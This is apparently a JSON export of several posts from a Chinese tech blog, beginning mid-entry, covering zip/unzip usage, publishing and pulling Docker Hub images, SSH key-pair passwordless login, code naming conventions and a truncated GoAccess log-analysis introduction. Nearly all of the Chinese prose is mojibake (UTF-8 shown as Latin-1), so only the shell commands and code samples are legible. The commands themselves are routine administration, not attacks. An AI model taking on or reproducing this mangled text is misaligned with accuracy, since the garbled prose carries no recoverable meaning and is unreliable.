å°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå…¶æ–‡ä»¶å¤¹ï¼Œå‹ç¼©ä¸º.zip æ–‡ä»¶ï¼š 1zip -q -r foo.zip &#x2F;&lt;path to dir&gt; æ³¨æ„ï¼Œäº§ç”Ÿçš„å‹ç¼©æ–‡ä»¶åœ¨æ‰§è¡Œå‘½ä»¤çš„é‚£ä¸ªç›®å½•ä¸‹ã€‚ è§£å‹unzip å‘½ä»¤ç”¨äºè§£å‹ç¼©ç”± zip å‘½ä»¤å‹ç¼©çš„ .zipå‹ç¼©åŒ…ã€‚ æŸ¥çœ‹å‹ç¼©åŒ…å†…å®¹ï¼š 1unzip -v foo.zip å°†å‹ç¼©æ–‡ä»¶åœ¨æŒ‡å®šç›®å½•ä¸‹è§£å‹ç¼©ï¼Œå¦‚æœå·²æœ‰ç›¸åŒçš„æ–‡ä»¶å­˜åœ¨ï¼Œè¦æ±‚ unzipå‘½ä»¤ä¸è¦†ç›–åŸå…ˆçš„æ–‡ä»¶ã€‚ 1unzip -n foo.zip -d &#x2F;&lt;file to dir&gt; å°†å‹ç¼©æ–‡ä»¶åœ¨å½“å‰ç›®ä¸‹è§£å‹ï¼Œå¦‚æœå·²æœ‰ç›¸åŒçš„æ–‡ä»¶ï¼Œä¸è¯¢é—®ï¼Œç›´æ¥è¦†ç›–ã€‚ 1unzip -o foo.zip æ€»ç»“Linux ä¸‹çš„å‹ç¼©è§£å‹å…¶å®å¹¶ä¸å¤æ‚ï¼Œåªæ˜¯ä¸å¸¸ç”¨çš„æƒ…å†µä¸‹ï¼Œå¾ˆå®¹å™¨å¿˜è®°ã€‚ å¦‚æœä½ ä¸çŸ¥é“åœ¨ä»€ä¹ˆåœºæ™¯ä¸‹ï¼Œè¯¥ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤ï¼Œå¯ä»¥å‚ç…§ï¼š å¦‚æœåªæœ‰ä¸€ä¸ªå¤§æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ gzip æˆ–è€… zipå‘½ä»¤ã€‚ å¦‚æœæ˜¯ä¸€ä¸ªå®Œæ•´çš„ç›®å½•ï¼Œé‡Œé¢æœ‰å¾ˆå¤šå­ç›®å½•ä»¥åŠæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨tarå‘½ä»¤ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Docker Hub å¿«é€Ÿä¸Šæ‰‹","slug":"docker-hub-quick-start","date":"2020-08-30T10:32:02.000Z","updated":"2020-08-30T10:35:11.952Z","comments":true,"path":"docker-hub-quick-start/","link":"","permalink":"https://www.0x2beace.com/docker-hub-quick-start/","excerpt":"æœ€è¿‘å°†å¸¸ä½¿ç”¨çš„é•œåƒæ”¾åœ¨äº†Docker ä»“åº“ï¼ˆDocker Hubï¼‰ä¸Šã€‚GitHub æ˜¯æ‰˜ç®¡ä»£ç çš„åœ°æ–¹ï¼Œè€ŒDocker Hub åˆ™æ˜¯æ‰˜ç®¡é•œåƒçš„åœ°æ–¹ã€‚","text":"æœ€è¿‘å°†å¸¸ä½¿ç”¨çš„é•œåƒæ”¾åœ¨äº†Docker ä»“åº“ï¼ˆDocker Hubï¼‰ä¸Šã€‚GitHub æ˜¯æ‰˜ç®¡ä»£ç çš„åœ°æ–¹ï¼Œè€ŒDocker Hub åˆ™æ˜¯æ‰˜ç®¡é•œåƒçš„åœ°æ–¹ã€‚ ç›®å‰å¤§éƒ¨åˆ†éœ€æ±‚éƒ½å¯ä»¥ç›´æ¥åœ¨ Docker Hub ä¸­ä¸‹è½½é•œåƒæ¥å®ç°ï¼Œå¦‚æœæƒ³ä½¿ç”¨è‡ªå·±ä»“åº“ä¸­çš„é•œåƒï¼Œé‚£ä¹ˆéœ€è¦å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ã€‚ åˆ›å»ºä»“åº“æƒ³è¦ä» Docker Hub ä½¿ç”¨è‡ªå·±çš„é•œåƒä¹‹å‰ï¼Œé¦–å…ˆå¾—åˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œç„¶åå°†ç›®æ ‡é•œé•œåƒ push åˆ°è¯¥ä»“åº“ã€‚ è¿™ä¸ªä»“åº“å¯ä»¥æ˜¯å…¬å¼€çš„ä¹Ÿå¯ä»¥æ˜¯ç§æœ‰çš„ï¼Œè¿™ä¸ªå¹¶ä¸å½±å“ä½ æ­£å¸¸ä½¿ç”¨ã€‚ åˆ›å»ºæˆåŠŸä¹‹åï¼Œå°±å¯ä»¥çœ‹åˆ°è¯¥ä»“åº“äº†ã€‚ å‘å¸ƒé•œåƒåœ¨å‘å¸ƒä¹‹å‰ï¼Œç¡®ä¿ä½ æœ¬åœ°å­˜åœ¨ç›®æ ‡é•œåƒï¼Œå¯ä»¥ä½¿ç”¨ docker imagesæ¥æŸ¥çœ‹ï¼š 123$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEadminer latest c3588b6003bb 3 weeks ago 90.4MB åˆ›å»º Tagï¼š 12345# è¯­æ³•docker tag local-image:tagname new-repo:tagname# å®ä¾‹docker tag adminer:latest hoooliday&#x2F;runfast:adminer å‰é¢çš„ tagname æ˜¯æœ¬åœ°é•œåƒçš„æ ‡ç­¾åç§°ï¼Œåé¢çš„tagname æ˜¯è¯¥é•œåƒåœ¨ä»“åº“ä¸­çš„æ ‡ç­¾åç§°ã€‚ å†æ¬¡æŸ¥çœ‹æœ¬åœ°é•œåƒï¼š 123$ docker imageshoooliday&#x2F;runfast adminer c3588b6003bb 3 weeks ago 90.4MBadminer latest c3588b6003bb 3 weeks ago 90.4MB å‘å¸ƒé•œåƒï¼š 12345# è¯­æ³•docker push new-repo:tagname# å®ä¾‹docker push hoooliday&#x2F;runfast:adminer å‘å¸ƒæˆåŠŸä¹‹åï¼Œå¯ä»¥æ‰“å¼€ Docker Hub åœ¨ Repositories çš„åˆ—è¡¨ä¸­å°±çœ‹åˆ°åˆšæ‰çš„é•œåƒäº†ã€‚ æ‹‰å–é•œåƒé¦–å…ˆéœ€è¦åœ¨å‘½ä»¤è¡Œä¸­ç™»å½•ä½ çš„ docker hub è´¦å·ï¼š 1$ docker login æ‹‰å–è‡ªå·±çš„é•œåƒï¼Œè¿™é‡Œä»¥ adminer è¿™ä¸ªé•œåƒä¸ºä¾‹ï¼š 1234docker run --link mysql:mysql --name adminer \\-d --restart&#x3D;always \\-p 8006:8080 \\hoooliday&#x2F;runfast:adminer å”¯ä¸€éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ€åä¸€è¡Œï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨å®˜æ–¹æœ€æ–°ç‰ˆæœ¬çš„ adminer ï¼Œé‚£å°±ç›´æ¥å†™æˆ adminerï¼Œä½†å¦‚æœæƒ³è¦ä½¿ç”¨è‡ªå·±çš„é•œåƒï¼Œé‚£å°±éœ€è¦å†™æˆ username/repo:tagname çš„æ ¼å¼ã€‚ æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰é•œåƒï¼š 12$ docker imageshoooliday&#x2F;runfast adminer c3588b6003bb 3 weeks ago 90.4MB æ­¤æŒå°±å®Œæˆäº†Docker é•œåƒçš„å‘å¸ƒå’Œæ‹‰å–äº†ï¼Œå½“ç„¶è¿™åªæ˜¯ Docker Hub æ‰€æœ‰åŠŸèƒ½ä¸­çš„å†°å±±ä¸€è§’ã€‚","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"},{"name":"Tutorial","slug":"Docker/Tutorial","permalink":"https://www.0x2beace.com/categories/Docker/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"},{"name":"Docker Hub","slug":"Docker-Hub","permalink":"https://www.0x2beace.com/tags/Docker-Hub/"}]},{"title":"Linux å¦‚ä½•ç”Ÿæˆå¯†é’¥å¯¹è¿›è¡Œ ssh å…å¯†ç™»å½•","slug":"how-to-generate-a-key-pair-for-ssh-login-without-password","date":"2020-08-29T03:46:41.000Z","updated":"2020-08-29T03:47:53.463Z","comments":true,"path":"how-to-generate-a-key-pair-for-ssh-login-without-password/","link":"","permalink":"https://www.0x2beace.com/how-to-generate-a-key-pair-for-ssh-login-without-password/","excerpt":"æœ€è¿‘å› ä¸ºé¡¹ç›®å¿«è¦ä¸Šçº¿äº†ï¼ŒæœåŠ¡å™¨ä»æµ‹è¯•ç¯å¢ƒè½¬åˆ°äº†ç”Ÿäº§ç¯å¢ƒï¼Œç™»å½•æ–¹å¼ä¹Ÿä»åŸæ¥çš„å¯†ç è®¤è¯æ›¿æ¢æˆäº†å¯†é’¥è®¤è¯ã€‚","text":"æœ€è¿‘å› ä¸ºé¡¹ç›®å¿«è¦ä¸Šçº¿äº†ï¼ŒæœåŠ¡å™¨ä»æµ‹è¯•ç¯å¢ƒè½¬åˆ°äº†ç”Ÿäº§ç¯å¢ƒï¼Œç™»å½•æ–¹å¼ä¹Ÿä»åŸæ¥çš„å¯†ç è®¤è¯æ›¿æ¢æˆäº†å¯†é’¥è®¤è¯ã€‚ è¿™ä¹ˆåšçš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢æœåŠ¡å™¨å¯†ç è¢«æš´åŠ›ç ´è§£ã€‚ ssh æ˜¯ä»€ä¹ˆï¼Ÿ ssh æ˜¯ä¸€ç§åè®®ï¼Œå®ƒå¯ä»¥åŸºäºå¯†ç è¿›è¡Œè®¤è¯ï¼Œä¹Ÿå¯ä»¥åŸºäºå¯†é’¥å»è®¤è¯ç”¨æˆ·ã€‚ ç”Ÿæˆå¯†é’¥å¯¹è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ RSA ç±»å‹çš„åŠ å¯†ç±»å‹æ¥åˆ›å»ºå¯†é’¥å¯¹ã€‚ 1ssh-keygen -f ~&#x2F;.ssh&#x2F;your_key_name -f å‚æ•°è¡¨ç¤ºæŒ‡å®šå¯†é’¥å¯¹ç”Ÿæˆä½ç½®ä¸åç§° å¯†é’¥å¯¹é€šå¸¸æ”¾åœ¨ $HOME/.ssh ç›®å½•ä¸‹ å›è½¦å³å¯åˆ›å»ºå¯†é’¥å¯¹ï¼Œå¦‚æœä¸éœ€è¦ä¸ºå¯†é’¥å¯¹è¿›è¡ŒåŠ å¯†ï¼Œé‚£ä¹ˆå¯ä»¥ä¸€è·¯å›è½¦ã€‚ åˆ›å»ºæˆåŠŸä¹‹åï¼Œå¯ä»¥çœ‹åˆ° .ssh ç›®å½•ä¸‹å¤šäº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯ï¼š your_keyï¼šå¯†é’¥å¯¹çš„ç§é’¥ï¼Œé€šå¸¸æ”¾åœ¨å®¢æˆ·ç«¯ã€‚ your_key.pubï¼šå¯†é’¥å¯¹ä¸­çš„å…¬é’¥ï¼Œé€šå¸¸æ”¾åœ¨æœåŠ¡ç«¯ã€‚ å°†æœ¬åœ°çš„å…¬é’¥ä¼ åˆ°æœåŠ¡å™¨ä¸Šæ³¨æ„ï¼šè¿™é‡Œæ˜¯å°†your_key.pub å…¬é’¥æ–‡ä»¶ä¸Šä¼ è‡³ä½ éœ€è¦è¿æ¥çš„æœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯your_keyç§é’¥æ–‡ä»¶ã€‚ 1ssh-copy-id -i ~&#x2F;.ssh&#x2F;your_key.pub user@&lt;ip address&gt; -pport -i å‚æ•°è¡¨ç¤ºä½¿ç”¨æŒ‡å®šçš„å¯†é’¥ï¼Œ-på‚æ•°è¡¨ç¤ºæŒ‡å®šç«¯å£ï¼Œssh çš„é»˜è®¤ç«¯å£æ˜¯ 22ï¼Œå¦‚æœæ²¡æœ‰æ›´æ”¹é»˜è®¤ç«¯å£ï¼Œåˆ™å¯ä»¥çœç•¥ã€‚ è¿™é‡Œéœ€è¦è¾“å…¥ä¸€æ¬¡å¯†ç è¿›è¡Œç¡®è®¤ï¼Œå¦‚æœæˆåŠŸä¹‹åï¼Œä¼šçœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š æœ¬åœ°çš„å…¬é’¥æ–‡ä»¶ä¸Šä¼ åœ¨æœåŠ¡å™¨çš„å“ªé‡Œï¼Ÿ åœ¨è¯¥ç”¨æˆ·çš„.ssh/authorized_keys æ–‡ä»¶ä¸­ã€‚ 1cat ~&#x2F;.ssh&#x2F;authorized_keys é€šè¿‡å¯†é’¥å¯¹è¿›è¡Œå…å¯†ç™»å½•ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç™»å½•åˆ°æœåŠ¡å™¨ä¸­äº†ï¼š 1ssh -p port -i ~&#x2F;.ssh&#x2F;your_key user@&lt;ip address&gt; ä¸å‡ºæ„å¤–ï¼Œå°±å¯ä»¥ä¸ç”¨è¾“å…¥å¯†ç è€Œç›´æ¥æˆåŠŸç™»å½•äº†ã€‚ å¦‚æœä½ ä»ç„¶éœ€è¦è¾“å…¥å¯†ç æˆ–è€…é‡åˆ°å…¶ä»–é—®é¢˜äº†ï¼Œå¯ä»¥ä»ä»¥ä¸‹æ–¹å‘è¿›è¡Œæ’æŸ¥ã€‚ å¸¸è§é—®é¢˜ï¼š å¦‚æœæ²¡æœ‰ä½¿ç”¨é»˜è®¤çš„å¯†é’¥åç§°ï¼ˆid_rsaï¼‰ï¼Œåˆ™åœ¨è¿æ¥ä¸»æœºæ—¶éœ€è¦åŠ ä¸Š-i å‚æ•°ï¼ŒæŒ‡å®šå¯¹åº”å¯†é’¥çš„åç§°ã€‚å¦åˆ™ç”±äºé»˜è®¤ç§é’¥ä¸è¿œç¨‹ä¸»æœºä¸­çš„è‡ªå®šä¹‰å…¬é’¥ä¸åŒ¹é…ï¼Œè‡ªç„¶æ— æ³•åŸºäºå¯†é’¥è¿›è¡Œè®¤è¯ï¼Œä¼šå†æ¬¡æç¤ºä½ è¾“å…¥å¯†ç ã€‚ æœåŠ¡ç«¯çš„$HOME/.sshç›®å½•çš„æ­£å¸¸æƒé™æ˜¯700ï¼ŒæœåŠ¡ç«¯$HOME/.ssh/authorized_keysæ–‡ä»¶çš„æƒé™é»˜è®¤ä¸º600ã€‚ ä¸Šä¼ å¯†é’¥æ—¶ä½¿ç”¨çš„æ˜¯ï¼šå…¬é’¥ï¼ˆ.pubï¼‰ï¼Œè¿›è¡Œå¯†é’¥è®¤è¯æ—¶ä½¿ç”¨çš„æ˜¯ï¼šç§é’¥ã€‚ é…ç½®ssh configä¸Šé¢çš„å‘½ä»¤è™½ç„¶å¯ä»¥å®ç°å…å¯†ç™»å½•ï¼Œä½†æ˜¯å‘½ä»¤å¤ªé•¿äº†ï¼Œå°±ç®—æ˜¯å¤åˆ¶ç²˜è´´ä¹Ÿæœ‰å¯èƒ½ä¼šå‡ºé”™ã€‚ é‚£æœ‰æ²¡æœ‰ä»€ä¹ˆå¥½çš„åŠæ³•ï¼Œè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ å½“ç„¶æ˜¯æœ‰çš„å•¦ã€‚ åœ¨$HOME/.ssh ç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªåä¸ºconfigçš„æ–‡ä»¶ã€‚ 1vim $HOME&#x2F;.ssh&#x2F;conifg åŠ å…¥ä»¥ä¸‹é…ç½®ï¼š 123456Host alias User user HostName ip address Port port IdentityFile ~&#x2F;.ssh&#x2F;your_key ServerAliveInterval 360 å‚æ•°è¯´æ˜ï¼š Hostï¼šå¯ä»¥ç†è§£æˆåˆ«åï¼Œé…ç½®å®Œæˆä¹‹åï¼Œæœ€åå°±é€šè¿‡ ssh alias è¿›è¡Œç™»å½•ã€‚ Userï¼šè¿œç¨‹ä¸»æœºçš„ç”¨æˆ·åç§° HostNameï¼šè¿œç¨‹ä¸»æœºçš„åœ°å€ Portï¼šç«¯å£å· IdentityFileï¼šç§é’¥æ–‡ä»¶çš„è·¯å¾„ ServerAliveIntervalï¼šä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¼šè¯åœ¨çŸ­æ—¶é—´å†…ä¸ä¼šæ–­å¼€ã€‚ å½“ç„¶ï¼Œå¦‚æœä½ æ˜¯ä½¿ç”¨ssh å®¢æˆ·ç«¯ï¼Œé‚£å°±ä¸ç”¨é…ç½®è¿™äº›ã€‚ ç¦ç”¨é€šè¿‡å¯†ç è®¤è¯å¦‚æœä¸Šé¢çš„é…ç½®éƒ½æ— è¯¯ï¼Œå¯ä»¥æ­£å¸¸é€šè¿‡å¯†é’¥è¿›è¡Œå…å¯†ç™»å½•ï¼Œé‚£ä¹ˆæœ€åéœ€è¦åšçš„ä¸€ä»¶äº‹æƒ…å°±æ˜¯å…³é—­æœåŠ¡ç«¯çš„é€šè¿‡å¯†ç è¿›è¡Œèº«ä»½è®¤è¯ã€‚ 1234vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config# å°†yes æ”¹ä¸º noPasswordAuthentication yes ç„¶åé‡å¯ sshd æœåŠ¡ã€‚ 1service sshd restart ä»¥ä¸Šå°±æ˜¯æœ‰å…³å¦‚ä½•ç”¨è‡ªå®šä¹‰çš„å¯†é’¥å¯¹è¿›è¡Œå…å¯†è®¤è¯çš„å…¨éƒ¨è¿‡ç¨‹äº†ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"SSH","slug":"SSH","permalink":"https://www.0x2beace.com/tags/SSH/"},{"name":"SSHD","slug":"SSHD","permalink":"https://www.0x2beace.com/tags/SSHD/"}]},{"title":"å‘½åè§„èŒƒâ€”â€”ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»","slug":"naming-convention-programmer-s-self-cultivation","date":"2020-08-28T13:36:57.000Z","updated":"2020-08-28T13:40:17.879Z","comments":true,"path":"naming-convention-programmer-s-self-cultivation/","link":"","permalink":"https://www.0x2beace.com/naming-convention-programmer-s-self-cultivation/","excerpt":"ä¹‹æ‰€ä»¥ä¼šæœ‰è¿™æ ·ä¸€ç¯‡ç¬”è®°å‘¢ï¼Œæ˜¯å› ä¸ºåœ¨å„ç§ä¸åŒçš„åœºæ™¯ä¸‹ï¼Œé¢ä¸´å‘½åè¿™ä»¶äº‹æƒ…ï¼Œæœ‰æ—¶å€™ä¼šçŠ¯è¿·ç³Šï¼Œä¸çŸ¥é“è¯¥å¦‚ä½•é€‰æ‹©æ­£ç¡®çš„æ–¹å¼å‘½åã€‚æ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ã€‚","text":"ä¹‹æ‰€ä»¥ä¼šæœ‰è¿™æ ·ä¸€ç¯‡ç¬”è®°å‘¢ï¼Œæ˜¯å› ä¸ºåœ¨å„ç§ä¸åŒçš„åœºæ™¯ä¸‹ï¼Œé¢ä¸´å‘½åè¿™ä»¶äº‹æƒ…ï¼Œæœ‰æ—¶å€™ä¼šçŠ¯è¿·ç³Šï¼Œä¸çŸ¥é“è¯¥å¦‚ä½•é€‰æ‹©æ­£ç¡®çš„æ–¹å¼å‘½åã€‚æ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ å‘½åè§„èŒƒå‘½åè§„èŒƒåŒ…å«äº†ï¼šç›®å½•ã€æ–‡ä»¶ã€å˜é‡ã€å‡½æ•°å‘½åã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼šå‘½åè§„åˆ™æ²¡æœ‰è°å¯¹è°é”™ï¼Œåœ¨é¡¹ç›®ä¸­ä¿æŒä¸€è‡´æ‰æ˜¯å…³é”®ã€‚ æ··ä¹±æˆ–é”™è¯¯çš„å‘½åä¸ä»…è®©æˆ‘ä»¬å¯¹ä»£ç éš¾ä»¥ç†è§£ï¼Œæ›´ç³Ÿç³•çš„æ˜¯ï¼Œä¼šè¯¯å¯¼æˆ‘ä»¬çš„æ€ç»´ï¼Œå¯¼è‡´å¯¹ä»£ç çš„ç†è§£å®Œå…¨é”™è¯¯ã€‚ç›¸åï¼Œè‰¯å¥½çš„å‘½åï¼Œåˆ™å¯ä»¥è®©æˆ‘ä»¬çš„ä»£ç éå¸¸å®¹æ˜“è¯»æ‡‚ï¼Œä¹Ÿèƒ½å‘è¯»è€…æ­£ç¡®è¡¨è¾¾äº‹ç‰©ä»¥åŠé€»è¾‘çš„æœ¬è´¨ï¼Œä»è€Œä½¿å¾—ä»£ç çš„å¯ç»´æŠ¤æ€§å°±å¤§å¤§å¢å¼ºï¼Œè¯»å‘½åå¥½çš„æ–‡ç« æ˜¯éå¸¸æµç•…çš„ï¼Œä¼šæœ‰ä¸€ç§äº«å—çš„æ„Ÿè§‰ã€‚ ç›®å½•å› ä¸ºWindowsï¼ŒOSX ä¸‹æ–‡ä»¶å¤¹ä¸åŒºåˆ†å¤§å°å†™ï¼ŒLinux æ˜¯åŒºåˆ†çš„ã€‚æ‰€ä»¥åœ¨æ–‡ä»¶å¤¹çš„å‘½åä¸Šé¢ï¼Œå»ºè®®å…¨éƒ¨ç”¨å°å†™ã€‚å¯ä»¥åŒ…å«ä¸‹åˆ’çº¿(_)æˆ–è¿å­—ç¬¦(-)ã€‚å¦‚æœæ²¡æœ‰çº¦å®šï¼Œ(_)æ›´å¥½ã€‚ æ–‡ä»¶æ–‡ä»¶çš„å‘½åä¹Ÿæ˜¯æ¨èå’Œç›®å½•çš„è¿å­—ç¬¦ä¿æŒä¸€è‡´ã€‚Linux æ–‡ä»¶ç³»ç»Ÿæ¨èçš„æ–‡ä»¶å‘½åæ˜¯ä¸‹åˆ’çº¿(_)ã€‚ ç±»ç±»å‹åç§°é€šå¸¸ä½¿ç”¨å¤§å†™é©¼å³°å‘½åæ³• 12class MyClass ... ç±»æˆå‘˜ä¸ç®¡æ˜¯é™æ€è¿˜æ˜¯éé™æ€ï¼Œç±»æ•°æ®æˆå‘˜çš„å‘½åéƒ½å¯ä»¥å’Œæ™®é€šå˜é‡ä¸€æ ·ï¼Œé‡‡ç”¨é©¼å³°å‘½åæ³•ï¼š 123456789class MyClass &#123; public $myVariable; public static $myStaticVariable; public function myFunction($firstWord, $secondWord)&#123; &#x2F;&#x2F;æ–¹æ³•ä¸­çš„å‚æ•°åæ¨èä½¿ç”¨å°é©¼å³°å‘½åæ³• ... &#125;;&#125; ä¸€èˆ¬åç§°çš„å‰ç¼€éƒ½æ˜¯æœ‰ç¬¬ä¸€è§„å¾‹çš„ï¼Œå¦‚isï¼ˆåˆ¤æ–­ï¼‰ã€getï¼ˆå¾—åˆ°ï¼‰ï¼Œsetï¼ˆè®¾ç½®ï¼‰ã€‚ å˜é‡å˜é‡çš„å‘½åæœ‰ä¸¤ç§æ–¹å¼ï¼š ä¸‹åˆ’çº¿å‘½åæ³•ï¼šmy_variable å°é©¼å³°å‘½åæ³•ï¼šmyVariable ä½†é€šå¸¸è¿˜æ˜¯æ¨èä½¿ç”¨ï¼Œä¸‹åˆ’çº¿å‘½åæ³•ï¼ˆå…¨æ˜¯å°å†™ï¼‰ã€‚ ä¸åŒçš„è¯­è¨€ä¹Ÿæ˜¯æœ‰ä¸åŒçš„è§„èŒƒï¼Œä¾‹å¦‚JavaScript å˜é‡æ¨èé©¼å³°å‘½åæ³•ï¼ŒCSS æ¨èè¿å­—ç¬¦(-)ã€‚ å¸¸é‡ã€å…¨å±€å¸¸é‡å¸¸é‡å’Œå…¨å±€å¸¸é‡é€šå¸¸ä½¿ç”¨å…¨å¤§å†™å’Œä¸‹åˆ’çº¿çš„æ–¹å¼æ¥å‘½åï¼Œä¾‹å¦‚ï¼š 12const MY_CONSTANT;define(&quot;DEFAULT_NUM&quot;, 10); ç‰¹æ®Šå˜é‡12345&#x2F;&#x2F;å¼•ç”¨å˜é‡&#x2F;&#x2F;é™æ€å˜é‡&#x2F;&#x2F;å…¨å±€å˜é‡ å‡½æ•°å‘½åå‡½æ•°çš„å‘½åä½¿ç”¨ä¸‹åˆ’çº¿å‘½åæ³•ï¼š 123function my_function()&#123; ...&#125; è¡¥å……è¯´æ˜å‡½æ•°å’Œæ–¹æ³•çš„åŒºåˆ«ï¼šå‡½æ•°æ˜¯ä¸€æ®µå¯ä»¥é‡ç”¨çš„ä»£ç å—ï¼Œæ–¹æ³•æ˜¯åœ¨ç±»é‡Œé¢çš„å‡½æ•°ã€‚ å‚è€ƒé“¾æ¥ï¼š PHP å‘½åè§„èŒƒ å¦‚ä½•ä¼˜é›…çš„ä¸ºå˜é‡å’Œå‡½æ•°å‘½å å‘½åçº¦å®š | Googleå¼€æºé¡¹ç›®é£æ ¼æŒ‡å— å‘½åè§„èŒƒ | ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»","categories":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"æ—¥å¿—åˆ†æå·¥å…· - GoAccess","slug":"log-analysis-tool-goaccess","date":"2020-08-27T14:59:41.000Z","updated":"2020-11-09T00:28:06.901Z","comments":true,"path":"log-analysis-tool-goaccess/","link":"","permalink":"https://www.0x2beace.com/log-analysis-tool-goaccess/","excerpt":"æ—¥å¿—çš„é‡è¦æ€§ä¸è¨€è€Œå–»ï¼Œå¯æˆ‘ä¼¼ä¹å®Œå…¨å¿½ç•¥äº†å®ƒï¼Œå¯¼è‡´å¾€å¾€å‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œç¬¬ä¸€æ—¶é—´å¹¶ä¸æ˜¯å»çœ‹æ—¥å¿—ã€‚","text":"æ—¥å¿—çš„é‡è¦æ€§ä¸è¨€è€Œå–»ï¼Œå¯æˆ‘ä¼¼ä¹å®Œå…¨å¿½ç•¥äº†å®ƒï¼Œå¯¼è‡´å¾€å¾€å‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œç¬¬ä¸€æ—¶é—´å¹¶ä¸æ˜¯å»çœ‹æ—¥å¿—ã€‚ å¾ˆæ˜¾ç„¶æˆ‘å®Œå…¨å¿½è§†äº†å®ƒçš„å¼ºå¤§æ€§ï¼Œå°±æ‹¿ nginx çš„è®¿é—®æ—¥å¿—æ¥è¯´ï¼Œå¯ä»¥ä»ä¸­åˆ†æå‡ºå¦‚ä¸‹ä¿¡æ¯ï¼š è¯·æ±‚çš„å“åº”æ—¶é—´ è¯·æ±‚è¾¾åˆ°çš„åç«¯æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£ è¯·æ±‚æ˜¯å¦å­˜åœ¨ç¼“å­˜é…ç½® è¯·æ±‚ä½“ã€è¯·æ±‚å¤´ã€å“åº”ä½“å’Œå“åº”å¤´çš„å¤§å°ç­‰ å®¢æˆ·ç«¯çš„IP åœ°å€ã€UserAgent ç­‰ä¿¡æ¯ è‡ªå®šä¹‰å˜é‡çš„å†…å®¹ é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œå¯ä»¥å¾—åˆ°å“åº”è€—æ—¶çš„è¯·æ±‚ä»¥åŠè¯·æ±‚é‡å’Œå¹¶å‘é‡ï¼Œä»è€Œåˆ†æå¹¶å‘åŸå› ï¼Œè¿™å¯¹äºåº”ç”¨çº§åˆ«çš„æœåŠ¡æ¥è¯´æ˜¯éå¸¸é‡è¦çš„ã€‚ GoAccess æ˜¯ä»€ä¹ˆGoAccess æ˜¯ä¸€ä¸ªå¼€æºçš„å®æ—¶ç½‘ç»œæ—¥å¿—åˆ†æå™¨å’Œäº¤äº’å¼æŸ¥çœ‹å™¨ï¼Œå¯ä»¥åœ¨ç±» Unix ç³»ç»Ÿä¸­çš„ç»ˆç«¯æˆ–é€šè¿‡æµè§ˆå™¨è¿è¡Œã€‚ â€”â€” GoAccess å®˜æ–¹ ä¸ºä»€ä¹ˆé€‰æ‹© GoAccessï¼Ÿ å› ä¸ºGoAccess è¢«è®¾è®¡æˆä¸€ä¸ªåŸºäºç»ˆç«¯çš„å¿«é€Ÿæ—¥å¿—åˆ†æå™¨ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯å®æ—¶å¿«é€Ÿåˆ†æå’ŒæŸ¥çœ‹WebæœåŠ¡å™¨ç»Ÿè®¡ä¿¡æ¯ï¼Œè€Œæ— éœ€ä½¿ç”¨æµè§ˆå™¨ã€‚åŒæ—¶ä¹Ÿå¯ä»¥å°†è¾“å…¥åˆ°HTML æˆ–è€… CSVã€JSONã€‚ GoAccesså‡ ä¹å¯ä»¥è§£æä»»ä½•Webæ—¥å¿—æ ¼å¼ï¼ˆApacheï¼ŒNginxï¼ŒAmazon S3ï¼ŒElastic Load Balancingï¼ŒCloudFrontç­‰ï¼‰ã€‚åªéœ€è¦è®¾ç½®æ—¥å¿—æ ¼å¼å¹¶æ ¹æ®æ‚¨çš„æ—¥å¿—è¿è¡Œå®ƒã€‚ GoAccess å…¥é—¨æ˜¨å¤©åœ¨ä½¿ç”¨ GoAccess 